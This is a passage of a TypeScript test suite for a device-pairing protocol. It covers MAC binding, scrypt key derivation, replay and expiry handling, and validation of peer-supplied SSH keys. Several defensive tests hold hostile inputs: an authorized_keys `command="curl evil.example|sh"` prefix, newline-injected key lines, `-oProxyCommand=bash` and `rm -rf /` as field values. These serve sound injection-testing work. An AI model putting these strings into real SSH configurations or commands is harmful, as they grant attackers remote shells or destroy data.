// SPDX-License-Identifier: AGPL-3.0-or-later
// Tests for the mesh pairing exchange (src/pairing.ts). Real WebCrypto, real HTTP (a live
// Bun.serve standing in for the responder machine), real bundles -- nothing about the module under
// test is mocked; only its two seams (applyPeer/auditAppend) and its clock are injected, exactly as
// node.ts supplies them.
//
// The load-bearing assertions here are the option-prefix ones: a peer must never be able to put its
// own text into the authorized_keys options position, and what reaches applyPeer must be a line this
// machine rebuilt.

import { afterEach, describe, expect, test } from 'bun:test';
import { createHash, scryptSync } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import {
  Pairing,
  constantTimeEqual,
  deriveCodeKey,
  formatCode,
  generateCode,
  macInput,
  macRequest,
  macResponse,
  normalizeCode,
} from '../src/pairing';
import type { PairingDeps } from '../src/pairing';
import { defaultConfig } from '../src/config';
import { canonicalJson } from '../src/util';
import type { AuditEntry, FleetConfig, PairBundle } from '../src/types';

const SELF = 'alpha';
const PEER = 'beta';

// A structurally real ed25519 SSH key blob: the wire-format type string plus 32 key bytes. No
// ssh-keygen subprocess needed -- the validator checks structure, not signature validity.
function sshEd25519(fill: number, comment = 'fleetuser@test'): string {
  const type = new TextEncoder().encode('ssh-ed25519');
  const blob = new Uint8Array(4 + type.length + 4 + 32);
  const dv = new DataView(blob.buffer);
  dv.setUint32(0, type.length);
  blob.set(type, 4);
  dv.setUint32(4 + type.length, 32);
  blob.set(new Uint8Array(32).fill(fill), 8 + type.length);
  return `ssh-ed25519 ${Buffer.from(blob).toString('base64')}${comment ? ` ${comment}` : ''}`;
}

async function realJwk(): Promise<JsonWebKey> {
  const kp = await crypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign', 'verify']);
  return crypto.subtle.exportKey('jwk', kp.publicKey);
}

async function bundle(machine: string, overrides: Partial<PairBundle> = {}): Promise<PairBundle> {
  return {
    v: 1,
    machine,
    role: machine === SELF ? 'anchor' : 'roamer',
    meshIp: machine === SELF ? '192.0.2.1' : '192.0.2.2',
    nodePort: 7710,
    publicKeyJwk: await realJwk(),
    sshUser: 'fleetuser',
    sshPublicKey: sshEd25519(machine === SELF ? 0x11 : 0x22),
    sshHostKeys: [sshEd25519(machine === SELF ? 0x33 : 0x44, '')],
    ...overrides,
  };
}

interface Harness {
  pairing: Pairing;
  applied: PairBundle[];
  audits: { kind: string; detail: Record<string, unknown> }[];
  setClock: (ms: number) => void;
  advance: (ms: number) => void;
  cfg: FleetConfig;
}

function harness(
  machine: string,
  local: PairBundle,
  opts: {
    applyPeer?: (p: PairBundle) => Promise<void>;
    rand?: (n: number) => Uint8Array;
    deriveKey?: (code: string) => Promise<CryptoKey>;
  } = {},
): Harness {
  const cfg = defaultConfig(machine);
  const applied: PairBundle[] = [];
  const audits: { kind: string; detail: Record<string, unknown> }[] = [];
  let clock = 1_700_000_000_000;

  const deps: PairingDeps = {
    cfg,
    auditAppend: async (kind, detail): Promise<AuditEntry> => {
      audits.push({ kind, detail });
      return { v: 1, machine, seq: audits.length, tsMs: clock, kind, detail, sigB64: 'test' };
    },
    localBundle: async () => local,
    applyPeer:
      opts.applyPeer ??
      (async (p) => {
        applied.push(p);
      }),
    now: () => clock,
    ...(opts.rand ? { rand: opts.rand } : {}),
    ...(opts.deriveKey ? { deriveKey: opts.deriveKey } : {}),
  };

  return {
    pairing: new Pairing(deps),
    applied,
    audits,
    cfg,
    setClock: (ms) => {
      clock = ms;
    },
    advance: (ms) => {
      clock += ms;
    },
  };
}

// Builds the exact bytes a well-behaved initiator would POST, so tests can replay/tamper with them.
async function helloBody(code: string, from: unknown, tsMs: number): Promise<string> {
  const key = await deriveCodeKey(code);
  const payload = { v: 1 as const, from, tsMs };
  return canonicalJson({ payload, mac: await macRequest(key, payload) });
}

function helloRequest(body: string): Request {
  return new Request('http://192.0.2.1:7710/pair/hello', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body,
  });
}

// The single code every handleHello test mints, so the harness's rand seam stays deterministic.
const FIXED_CODE = 'ZZZZZZZZZZZZ';
const fixedRand = (n: number): Uint8Array => new Uint8Array(n).fill(0xff);

const servers: ReturnType<typeof Bun.serve>[] = [];
afterEach(() => {
  for (const s of servers.splice(0)) s.stop(true);
});

function serve(handler: (req: Request) => Promise<Response>): { port: number } {
  const s = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch: handler });
  servers.push(s);
  return { port: s.port ?? 0 };
}

// ---------------------------------------------------------------------------

describe('code encoding', () => {
  test('generateCode emits exactly 12 Crockford characters and spans the full 60 bits', () => {
    expect(generateCode(() => new Uint8Array(8))).toBe('000000000000');
    expect(generateCode(() => new Uint8Array(8).fill(0xff))).toBe('ZZZZZZZZZZZZ');
    const code = generateCode();
    expect(code).toHaveLength(12);
    expect(code).toMatch(/^[0-9A-HJKMNP-TV-Z]{12}$/);
  });

  // 2^60 exceeds 2^53, so an encoder that folds the eight random bytes into one JS number loses the
  // low bits and silently mints a code space smaller than the one this module advertises. These
  // vectors pin the bit arithmetic: every 5-bit group must land where big-endian says it does.
  test('the 60 bits are read big-endian, with no precision lost at the low end', () => {
    // The last four of the sixty-four bits are discarded (64 - 60), so 0x01 must NOT reach the
    // code and 0x10 -- the lowest bit that survives -- must land in the last character.
    expect(generateCode(() => Uint8Array.from([0, 0, 0, 0, 0, 0, 0, 0x01]))).toBe('000000000000');
    expect(generateCode(() => Uint8Array.from([0, 0, 0, 0, 0, 0, 0, 0x10]))).toBe('000000000001');
    // Top byte first: 0xf8 is the leading five bits, so only the first character moves.
    expect(generateCode(() => Uint8Array.from([0xf8, 0, 0, 0, 0, 0, 0, 0]))).toBe('Z00000000000');
    // A byte in the middle straddles character boundaries rather than sitting inside one: the
    // fourth byte is bits 24..31, which is the last bit of character 5, all of character 6, and
    // the first two bits of character 7.
    expect(generateCode(() => Uint8Array.from([0, 0, 0, 0xff, 0, 0, 0, 0]))).toBe('00001ZR00000');
  });

  test('generateCode is uniform enough to not be a constant', () => {
    const seen = new Set<string>();
    for (let i = 0; i < 200; i++) seen.add(generateCode());
    expect(seen.size).toBeGreaterThan(190);
  });

  test('a short rand() is a hard error, never a shortened code', () => {
    expect(() => generateCode(() => new Uint8Array(2))).toThrow(/fewer than 8 bytes/);
  });

  test('formatCode/normalizeCode round-trip and fold the confusable characters', () => {
    expect(formatCode('K7QP4M2XR9TV')).toBe('K7QP-4M2X-R9TV');
    expect(normalizeCode(formatCode('K7QP4M2XR9TV'))).toBe('K7QP4M2XR9TV');
    expect(normalizeCode(' k7qp - 4m2x - r9tv ')).toBe('K7QP4M2XR9TV');
    // O/I/L are absent from the encode alphabet, so folding them can never collide with a real code.
    expect(normalizeCode('oil000000000')).toBe('011000000000');
    expect(normalizeCode('OIL000000000')).toBe('011000000000');
  });

  test('constantTimeEqual matches only on identical bytes', () => {
    expect(constantTimeEqual('abc', 'abc')).toBe(true);
    expect(constantTimeEqual('abc', 'abd')).toBe(false);
    expect(constantTimeEqual('abc', 'ab')).toBe(false);
    expect(constantTimeEqual('', '')).toBe(true);
  });
});

// The frozen pairing vectors. golden.json records the exact bytes the pre-extraction daemon MACs
// over; while one machine runs each codebase, these may not change.
const golden = JSON.parse(readFileSync(join(import.meta.dir, 'freeze', 'golden.json'), 'utf8')) as {
  fixedTimestampMs: number;
  pairing: { bundle: unknown; helloRequestMacInput: string; helloResponseMacInput: string };
};

const V1_DOMAIN = 'sukarfleet-pair-v1|';
const V2_DOMAIN = 'sukarfleet-pair-v2|';
const SCRYPT = { N: 32768, r: 8, p: 1, maxmem: 64 * 1024 * 1024 } as const;

async function importHmacKey(material: Uint8Array): Promise<CryptoKey> {
  return crypto.subtle.importKey('raw', material as BufferSource, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
}

// What the wire bytes are, not just that both sides agree on them. Everything else in this file
// checks the two halves against each other, which would stay green if the MAC input silently
// changed shape on both sides at once -- and that is precisely the change that breaks pairing
// against a machine still running the pre-extraction daemon.
describe('the bytes the MACs are taken over are frozen', () => {
  test('a hello request MACs over exactly the recorded string', () => {
    const payload = { v: 1, from: golden.pairing.bundle, tsMs: golden.fixedTimestampMs };
    expect(macInput('req|', payload)).toBe(golden.pairing.helloRequestMacInput);
  });

  test('a hello response MACs over exactly the recorded string, request digest bound in', () => {
    const payload = {
      v: 1,
      from: golden.pairing.bundle,
      tsMs: golden.fixedTimestampMs,
      reqSha256: 'c'.repeat(64),
    };
    expect(macInput('res|', payload)).toBe(golden.pairing.helloResponseMacInput);
  });

  test("the 'req|'/'res|' prefixes are what separates the two, byte for byte", () => {
    const payload = { v: 1, tsMs: 1 };
    expect(macInput('res|', payload)).toBe(`res|${macInput('req|', payload).slice(4)}`);
  });
});

describe('the code-derived key', () => {
  // The offline oracle this KDF exists to defeat gets slower in exact proportion to N: a future
  // hand tempted to speed the GUI up by dropping it has to change this vector to do it.
  test('is scrypt(N=2^15, r=8, p=1) over the v2 domain, not a hash', async () => {
    const payload = { v: 1, tsMs: 1 };
    const pinned = await importHmacKey(scryptSync(FIXED_CODE, V2_DOMAIN, 32, SCRYPT));
    expect(await macRequest(await deriveCodeKey(FIXED_CODE), payload)).toBe(await macRequest(pinned, payload));
  });

  test('is deterministic: the same code derives the same key every time', async () => {
    const payload = { v: 1, tsMs: 1 };
    const a = await macRequest(await deriveCodeKey(FIXED_CODE), payload);
    const b = await macRequest(await deriveCodeKey(FIXED_CODE), payload);
    expect(a).toBe(b);
    expect(a).not.toBe(await macRequest(await deriveCodeKey('AAAAAAAAAAAA'), payload));
  });

  // The domain bump is what stops a v1 code and a v2 code that share characters from deriving one
  // key: a machine still on v1 fails to pair rather than half-agreeing on the weaker derivation.
  test('a v1 code and a v2 code can never derive the same key', async () => {
    const payload = { v: 1, tsMs: 1 };
    const v2 = await macRequest(await deriveCodeKey(FIXED_CODE), payload);

    // v1 as it actually shipped: one sha256 over domain + code.
    const v1Sha = await importHmacKey(createHash('sha256').update(V1_DOMAIN + FIXED_CODE).digest());
    expect(await macRequest(v1Sha, payload)).not.toBe(v2);

    // And the domain alone separates them, so a future version that keeps scrypt but forgets to
    // bump the string would still not collide with v2 by accident.
    const v1Scrypt = await importHmacKey(scryptSync(FIXED_CODE, V1_DOMAIN, 32, SCRYPT));
    expect(await macRequest(v1Scrypt, payload)).not.toBe(v2);
  });

  // scryptSync would hold this daemon's ONE event loop for the whole derivation, and a loop that
  // stops for ~50 ms is a clock an on-mesh party can read: poll any cheap route and the stall tells
  // them a code was just minted. A 5 ms timer must get its turn while the KDF is running, which it
  // cannot do if the derivation is sitting on the loop.
  test('runs off the event loop, so a mint is not a stall anyone can time', async () => {
    let firedDuringDerivation = false;
    const timer = setTimeout(() => {
      firedDuringDerivation = true;
    }, 5);
    await deriveCodeKey(FIXED_CODE);
    clearTimeout(timer);
    expect(firedDuringDerivation).toBe(true);
  });
});

// The failure this daemon must survive rather than reason about: a platform that will not do
// scrypt at all (an OpenSSL in FIPS mode refuses it outright; a machine under memory pressure can
// fail the 32 MiB allocation). mintCode is synchronous and parks the derivation's promise, so
// before the fix that rejection had nobody to catch it, and nothing in src/ installs an
// unhandledRejection handler -- the daemon exited 1 because an operator clicked "mint code".
describe('a KDF that refuses to derive', () => {
  const kdfDown = async (): Promise<CryptoKey> => {
    throw new Error('digital envelope routines::unsupported');
  };

  test('mintCode still returns a code, and its parked promise never rejects', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand, deriveKey: kdfDown });
    expect(() => h.pairing.mintCode()).not.toThrow();
    expect(h.pairing.codeState().active).toBe(true);

    // Reaching into the private field on purpose. That parked promise IS the finding: nothing
    // awaits it until a hello arrives, which may be never, so it is the object that has to be
    // proved settled rather than rejected. Asserting it through the hello route instead (the next
    // test) proves the response but not this. It must RESOLVE, to the null "key unusable" state.
    const parked = (h.pairing as unknown as { active: { key: Promise<CryptoKey | null> } }).active.key;
    await expect(parked).resolves.toBeNull();

    // And a couple of full loop turns later there is still nothing pending to blow up: with the
    // rejection absorbed at mint, the daemon has no reason to reach an unhandledRejection it does
    // not install a handler for.
    await new Promise((r) => setTimeout(r, 20));
    expect(h.pairing.codeState().active).toBe(true);
  });

  test('a hello against that code gets the byte-identical 401, not a 500', async () => {
    const peerBundle = await bundle(PEER);
    const body = await helloBody(FIXED_CODE, peerBundle, 1_700_000_000_000);

    // The reference refusal: the same request against a machine with no code minted at all.
    const control = harness(SELF, await bundle(SELF), { rand: fixedRand });
    const expected = await control.pairing.handleHello(helloRequest(body));
    expect(expected.status).toBe(401);

    const h = harness(SELF, await bundle(SELF), { rand: fixedRand, deriveKey: kdfDown });
    h.pairing.mintCode();
    // The code is RIGHT -- this is the correct MAC for the code that was minted. Only the local
    // key is missing, and the caller must not be able to tell that from a wrong code.
    const res = await h.pairing.handleHello(helloRequest(body));
    expect(res.status).toBe(401);
    expect(await res.text()).toBe(await expected.text());
    expect(res.headers.get('content-type')).toBe(expected.headers.get('content-type'));
    expect(h.applied).toHaveLength(0);
    expect(h.audits).toHaveLength(0);
  });

  test('the redeem half reports a local failure rather than throwing out of the route', async () => {
    const initiator = harness(PEER, await bundle(PEER), { deriveKey: kdfDown });
    const out = await initiator.pairing.redeem({ code: 'ZZZZ-ZZZZ-ZZZZ', host: '127.0.0.1', port: 7710 });
    expect(out.ok).toBe(false);
    // Not 'bad-code': the operator typed a fine code and must not be sent to re-read the screen.
    expect(out.reason).toBe('bad-response');
    expect(initiator.applied).toHaveLength(0);
  });
});

describe('MAC domain separation', () => {
  test('request and response MACs over the same payload differ', async () => {
    const key = await deriveCodeKey('ZZZZZZZZZZZZ');
    const payload = { v: 1, tsMs: 1 };
    expect(await macRequest(key, payload)).not.toBe(await macResponse(key, payload));
  });

  test('different codes produce different MACs over the same payload', async () => {
    const payload = { v: 1, tsMs: 1 };
    const a = await macRequest(await deriveCodeKey('AAAAAAAAAAAA'), payload);
    const b = await macRequest(await deriveCodeKey('AAAAAAAB'), payload);
    expect(a).not.toBe(b);
  });
});

describe('handleHello — happy path', () => {
  test('accepts a correctly MACd bundle, installs the peer, audits, and returns a bound response', async () => {
    const local = await bundle(SELF);
    const h = harness(SELF, local, { rand: fixedRand });
    const minted = h.pairing.mintCode();
    expect(minted.display).toBe('ZZZZ-ZZZZ-ZZZZ');

    const peerBundle = await bundle(PEER);
    const body = await helloBody(FIXED_CODE, peerBundle, 1_700_000_000_000);
    const res = await h.pairing.handleHello(helloRequest(body));

    expect(res.status).toBe(200);
    expect(h.applied).toHaveLength(1);
    expect(h.applied[0]!.machine).toBe(PEER);
    expect(h.audits).toHaveLength(1);
    expect(h.audits[0]!.kind).toBe('pair-accepted');
    expect(h.audits[0]!.detail.peerMachine).toBe(PEER);
    expect(h.audits[0]!.detail.mode).toBe('responder');
    expect(String(h.audits[0]!.detail.sshKeyFingerprint)).toMatch(/^SHA256:[A-Za-z0-9+/]{43}$/);

    // The response MAC must verify AND be bound to the exact request payload.
    const parsed = (await res.json()) as { payload: { reqSha256: string; from: PairBundle }; mac: string };
    const key = await deriveCodeKey(FIXED_CODE);
    expect(await macResponse(key, parsed.payload)).toBe(parsed.mac);
    const sentPayload = JSON.parse(body).payload as unknown;
    const expectedSha = new Bun.CryptoHasher('sha256').update(canonicalJson(sentPayload)).digest('base64');
    expect(parsed.payload.reqSha256).toBe(expectedSha);
    expect(parsed.payload.from.machine).toBe(SELF);

    // The code is consumed by the success itself.
    expect(h.pairing.codeState().active).toBe(false);
    expect(h.pairing.codeState().pairedWith).toBe(PEER);
  });
});

describe('handleHello — refusals are uniform and fail closed', () => {
  async function refusalBody(res: Response): Promise<string> {
    return res.text();
  }

  test('wrong code is rejected with the same 401 as no code at all', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    const peerBundle = await bundle(PEER);

    const noCode = await h.pairing.handleHello(
      helloRequest(await helloBody(FIXED_CODE, peerBundle, 1_700_000_000_000)),
    );
    expect(noCode.status).toBe(401);

    h.pairing.mintCode();
    const wrong = await h.pairing.handleHello(
      helloRequest(await helloBody('AAAAAAAAAAAA', peerBundle, 1_700_000_000_000)),
    );
    expect(wrong.status).toBe(401);
    expect(await refusalBody(wrong)).toBe(await refusalBody(noCode));
    expect(h.applied).toHaveLength(0);
    expect(h.audits).toHaveLength(0);
  });

  test('a replayed hello is refused even though it was valid the first time', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();
    const body = await helloBody(FIXED_CODE, await bundle(PEER), 1_700_000_000_000);

    const first = await h.pairing.handleHello(helloRequest(body));
    expect(first.status).toBe(200);
    const second = await h.pairing.handleHello(helloRequest(body));
    expect(second.status).toBe(401);

    expect(h.applied).toHaveLength(1);
    expect(h.audits).toHaveLength(1);
  });

  test('re-minting after a success does not resurrect the burned exchange', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();
    const body = await helloBody(FIXED_CODE, await bundle(PEER), 1_700_000_000_000);
    expect((await h.pairing.handleHello(helloRequest(body))).status).toBe(200);

    // A fresh code with identical characters (the rand seam is fixed) still rejects the old
    // request, because its tsMs is now outside the freshness window.
    h.advance(200_000);
    h.pairing.mintCode();
    expect((await h.pairing.handleHello(helloRequest(body))).status).toBe(401);
    expect(h.applied).toHaveLength(1);
  });

  test('an expired code is refused', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();
    h.advance(300_001);

    const body = await helloBody(FIXED_CODE, await bundle(PEER), 1_700_000_000_000 + 300_001);
    const res = await h.pairing.handleHello(helloRequest(body));
    expect(res.status).toBe(401);
    expect(h.applied).toHaveLength(0);
    expect(h.pairing.codeState().active).toBe(false);
  });

  test('a stale timestamp is refused even with the right code', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();
    const body = await helloBody(FIXED_CODE, await bundle(PEER), 1_700_000_000_000 - 120_001);
    expect((await h.pairing.handleHello(helloRequest(body))).status).toBe(401);
    expect(h.applied).toHaveLength(0);
  });

  test('a tampered bundle invalidates the MAC', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();

    const honest = await bundle(PEER);
    const body = JSON.parse(await helloBody(FIXED_CODE, honest, 1_700_000_000_000));
    // Swap the SSH key an attacker would want installed, keeping the original (valid) MAC.
    body.payload.from.sshPublicKey = sshEd25519(0x99);
    const res = await h.pairing.handleHello(helloRequest(JSON.stringify(body)));

    expect(res.status).toBe(401);
    expect(h.applied).toHaveLength(0);
  });

  test('five bad attempts burn the code, so the right one no longer works', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();
    const peerBundle = await bundle(PEER);

    for (let i = 0; i < 5; i++) {
      const res = await h.pairing.handleHello(
        helloRequest(await helloBody('AAAAAAAAAAAA', peerBundle, 1_700_000_000_000)),
      );
      expect(res.status).toBe(401);
    }
    expect(h.pairing.codeState().active).toBe(false);

    const withRightCode = await h.pairing.handleHello(
      helloRequest(await helloBody(FIXED_CODE, peerBundle, 1_700_000_000_000)),
    );
    expect(withRightCode.status).toBe(401);
    expect(h.applied).toHaveLength(0);
  });

  test('attemptsLeft is visible to the GUI and decrements per bad attempt', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();
    expect(h.pairing.codeState().attemptsLeft).toBe(5);
    await h.pairing.handleHello(helloRequest(await helloBody('AAAAAAAAAAAA', await bundle(PEER), 1_700_000_000_000)));
    expect(h.pairing.codeState().attemptsLeft).toBe(4);
  });

  test('cancelCode makes a live code stop working immediately', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();
    h.pairing.cancelCode();
    const res = await h.pairing.handleHello(
      helloRequest(await helloBody(FIXED_CODE, await bundle(PEER), 1_700_000_000_000)),
    );
    expect(res.status).toBe(401);
  });

  test('malformed envelopes and bad JSON share one 400 body', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();

    const badJson = await h.pairing.handleHello(helloRequest('{not json'));
    const badShape = await h.pairing.handleHello(helloRequest(JSON.stringify({ payload: {}, mac: 'x' })));
    expect(badJson.status).toBe(400);
    expect(badShape.status).toBe(400);
    expect(await badJson.text()).toBe(await badShape.text());
  });

  test('an oversized body is capped before anything is parsed', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();
    const res = await h.pairing.handleHello(helloRequest(JSON.stringify({ pad: 'x'.repeat(70_000) })));
    expect(res.status).toBe(413);
  });
});

describe('handleHello — a peer can never supply its own authorized_keys options', () => {
  async function rejects(patch: Partial<PairBundle>): Promise<{ status: number; applied: number }> {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();
    const peerBundle = await bundle(PEER, patch);
    const res = await h.pairing.handleHello(
      helloRequest(await helloBody(FIXED_CODE, peerBundle, 1_700_000_000_000)),
    );
    return { status: res.status, applied: h.applied.length };
  }

  test('an option prefix in front of the key type is refused outright', async () => {
    const key = sshEd25519(0x22);
    expect(
      await rejects({ sshPublicKey: `restrict,command="curl evil.example|sh" ${key}` }),
    ).toEqual({ status: 400, applied: 0 });
    expect(await rejects({ sshPublicKey: `no-pty,command="bash -i" ${key}` })).toEqual({ status: 400, applied: 0 });
    expect(await rejects({ sshPublicKey: `from="0.0.0.0/0" ${key}` })).toEqual({ status: 400, applied: 0 });
  });

  test('a newline that would start a second authorized_keys line is refused', async () => {
    const key = sshEd25519(0x22);
    expect(await rejects({ sshPublicKey: `${key}\ncommand="bash" ${sshEd25519(0x77)}` })).toEqual({
      status: 400,
      applied: 0,
    });
    expect(await rejects({ sshPublicKey: `${key}\r\ncommand="bash" ${sshEd25519(0x77)}` })).toEqual({
      status: 400,
      applied: 0,
    });
    expect(await rejects({ sshPublicKey: `${key}\0` })).toEqual({ status: 400, applied: 0 });
  });

  test('the same defences apply to host keys, which land in known_hosts', async () => {
    expect(await rejects({ sshHostKeys: [`@cert-authority * ${sshEd25519(0x44, '')}`] })).toEqual({
      status: 400,
      applied: 0,
    });
    expect(await rejects({ sshHostKeys: [`${sshEd25519(0x44, '')}\n192.0.2.9 ${sshEd25519(0x55, '')}`] })).toEqual({
      status: 400,
      applied: 0,
    });
    expect(await rejects({ sshHostKeys: [] })).toEqual({ status: 400, applied: 0 });
  });

  test('a non-ed25519 client key is refused (only the algorithm the fleet issues is accepted)', async () => {
    expect(await rejects({ sshPublicKey: 'ssh-rsa AAAAB3NzaC1yc2E= rsa@peer' })).toEqual({
      status: 400,
      applied: 0,
    });
  });

  test('a key whose blob disagrees with its declared type is refused', async () => {
    // Declared ssh-ed25519, blob says ssh-rsa: sshd trusts the blob, so the two must agree.
    const type = new TextEncoder().encode('ssh-rsa');
    const blob = new Uint8Array(4 + type.length + 4 + 32);
    const dv = new DataView(blob.buffer);
    dv.setUint32(0, type.length);
    blob.set(type, 4);
    dv.setUint32(4 + type.length, 32);
    const line = `ssh-ed25519 ${Buffer.from(blob).toString('base64')}`;
    expect(await rejects({ sshPublicKey: line })).toEqual({ status: 400, applied: 0 });
  });

  test('what reaches applyPeer is rebuilt locally, not the peer-supplied string', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();

    const honest = sshEd25519(0x22, '');
    const b64 = honest.split(' ')[1]!;
    // A comment we do not vouch for is dropped rather than forwarded into the authorized_keys line.
    const peerBundle = await bundle(PEER, { sshPublicKey: `ssh-ed25519 ${b64} evil" command="bash` });
    const res = await h.pairing.handleHello(
      helloRequest(await helloBody(FIXED_CODE, peerBundle, 1_700_000_000_000)),
    );

    expect(res.status).toBe(200);
    expect(h.applied).toHaveLength(1);
    expect(h.applied[0]!.sshPublicKey).toBe(`ssh-ed25519 ${b64}`);
    expect(h.applied[0]!.sshPublicKey).not.toContain('command=');
    expect(h.applied[0]!.sshPublicKey).not.toContain('"');
  });

  test('the installed jwk is rebuilt to {kty,crv,x,y} and private material is refused', async () => {
    const h = harness(SELF, await bundle(SELF), { rand: fixedRand });
    h.pairing.mintCode();
    const peerBundle = await bundle(PEER);
    expect(Object.keys(peerBundle.publicKeyJwk).length).toBeGreaterThan(4); // WebCrypto adds key_ops/ext

    const res = await h.pairing.handleHello(
      helloRequest(await helloBody(FIXED_CODE, peerBundle, 1_700_000_000_000)),
    );
    expect(res.status).toBe(200);
    expect(Object.keys(h.applied[0]!.publicKeyJwk).sort()).toEqual(['crv', 'kty', 'x', 'y']);

    // And a bundle carrying a private key component never installs at all.
    const withPrivate = await rejects({
      publicKeyJwk: { ...(await realJwk()), d: 'AAAA' } as JsonWebKey,
    });
    expect(withPrivate).toEqual({ status: 400, applied: 0 });
  });

  test('fields that reach an ssh argv or a from= option are charset-restricted', async () => {
    expect(await rejects({ meshIp: '192.0.2.2",command="bash' })).toEqual({ status: 400, applied: 0 });
    expect(await rejects({ meshIp: 'peer.example.com' })).toEqual({ status: 400, applied: 0 });
    expect(await rejects({ meshIp: '192.0.2.999' })).toEqual({ status: 400, applied: 0 });
    expect(await rejects({ sshUser: '-oProxyCommand=bash' })).toEqual({ status: 400, applied: 0 });
    expect(await rejects({ sshUser: 'root; rm -rf /' })).toEqual({ status: 400, applied: 0 });
    expect(await rejects({ machine: 'beta\nalpha' })).toEqual({ status: 400, applied: 0 });
    expect(await rejects({ machine: 'sukar laptop' })).toEqual({ status: 400, applied: 0 });
    expect(await rejects({ nodePort: 0 })).toEqual({ status: 400, applied: 0 });
    expect(await rejects({ nodePort: 7710.5 })).toEqual({ status: 400, applied: 0 });
    expect(await rejects({ role: 'admin' as PairBundle['role'] })).toEqual({ status: 400, applied: 0 });
  });

  test('a bundle claiming to be this machine is refused', async () => {
    expect(await rejects({ machine: SELF })).toEqual({ status: 400, applied: 0 });
  });
});

describe('redeem — the initiator half, over real HTTP', () => {
  // Wires a live responder daemon and returns its port plus its harness.
  async function responder(rand = fixedRand): Promise<{ h: Harness; port: number }> {
    const h = harness(SELF, await bundle(SELF), { rand });
    const { port } = serve((req) => h.pairing.handleHello(req));
    return { h, port };
  }

  test('happy path pairs BOTH machines from one round trip', async () => {
    const { h: target, port } = await responder();
    const minted = target.pairing.mintCode();

    const initiator = harness(PEER, await bundle(PEER));
    const out = await initiator.pairing.redeem({ code: minted.display, host: '127.0.0.1', port });

    expect(out).toEqual({ ok: true, peer: SELF });

    // Responder installed the initiator...
    expect(target.applied).toHaveLength(1);
    expect(target.applied[0]!.machine).toBe(PEER);
    expect(target.audits[0]!.detail.mode).toBe('responder');

    // ...and the initiator installed the responder, from the same exchange.
    expect(initiator.applied).toHaveLength(1);
    expect(initiator.applied[0]!.machine).toBe(SELF);
    expect(initiator.applied[0]!.sshPublicKey.startsWith('ssh-ed25519 ')).toBe(true);
    expect(initiator.audits).toHaveLength(1);
    expect(initiator.audits[0]!.kind).toBe('pair-accepted');
    expect(initiator.audits[0]!.detail.mode).toBe('initiator');
    expect(initiator.pairing.codeState().pairedWith).toBe(SELF);
  });

  test('the operator can type the code in any human form', async () => {
    const { h: target, port } = await responder();
    target.pairing.mintCode();
    const initiator = harness(PEER, await bundle(PEER));
    const out = await initiator.pairing.redeem({ code: ' zzzz-zzzz-zzzz ', host: '127.0.0.1', port });
    expect(out.ok).toBe(true);
  });

  test('a wrong code leaves neither side paired', async () => {
    const { h: target, port } = await responder();
    target.pairing.mintCode();

    const initiator = harness(PEER, await bundle(PEER));
    const out = await initiator.pairing.redeem({ code: 'AAAA-AAAA-AAAA', host: '127.0.0.1', port });

    expect(out.ok).toBe(false);
    expect(out.reason).toBe('bad-code');
    expect(target.applied).toHaveLength(0);
    expect(initiator.applied).toHaveLength(0);
  });

  test('a code cannot be redeemed twice', async () => {
    const { h: target, port } = await responder();
    const minted = target.pairing.mintCode();

    const first = harness(PEER, await bundle(PEER));
    expect((await first.pairing.redeem({ code: minted.display, host: '127.0.0.1', port })).ok).toBe(true);

    const second = harness('third-machine', await bundle('third-machine'));
    const out = await second.pairing.redeem({ code: minted.display, host: '127.0.0.1', port });
    expect(out.reason).toBe('bad-code');
    expect(second.applied).toHaveLength(0);
    expect(target.applied).toHaveLength(1);
  });

  test('an expired code is refused end to end', async () => {
    const { h: target, port } = await responder();
    const minted = target.pairing.mintCode();
    target.advance(300_001);

    const initiator = harness(PEER, await bundle(PEER));
    initiator.advance(300_001);
    const out = await initiator.pairing.redeem({ code: minted.display, host: '127.0.0.1', port });
    expect(out.reason).toBe('bad-code');
    expect(initiator.applied).toHaveLength(0);
  });

  test('a malformed code never touches the network', async () => {
    const initiator = harness(PEER, await bundle(PEER));
    // Port 1 would refuse instantly; the point is that the reason is bad-code, not unreachable.
    const out = await initiator.pairing.redeem({ code: 'nope', host: '127.0.0.1', port: 1 });
    expect(out.reason).toBe('bad-code');
  });

  test('an unusable address is reported as unreachable, not as a bad code', async () => {
    const initiator = harness(PEER, await bundle(PEER));
    expect((await initiator.pairing.redeem({ code: 'ZZZZ-ZZZZ-ZZZZ', host: 'a b c', port: 7710 })).reason).toBe(
      'unreachable',
    );
    expect((await initiator.pairing.redeem({ code: 'ZZZZ-ZZZZ-ZZZZ', host: '127.0.0.1', port: 0 })).reason).toBe(
      'unreachable',
    );
  });

  test('a response MACd under a different code is refused', async () => {
    // A rogue responder that answers with a structurally perfect but wrongly-keyed response.
    const rogue = await bundle(SELF);
    const { port } = serve(async (req) => {
      const req_ = (await req.json()) as { payload: unknown };
      const key = await deriveCodeKey('AAAAAAAAAAAA');
      const payload = {
        v: 1 as const,
        from: rogue,
        tsMs: 1_700_000_000_000,
        reqSha256: new Bun.CryptoHasher('sha256').update(canonicalJson(req_.payload)).digest('base64'),
      };
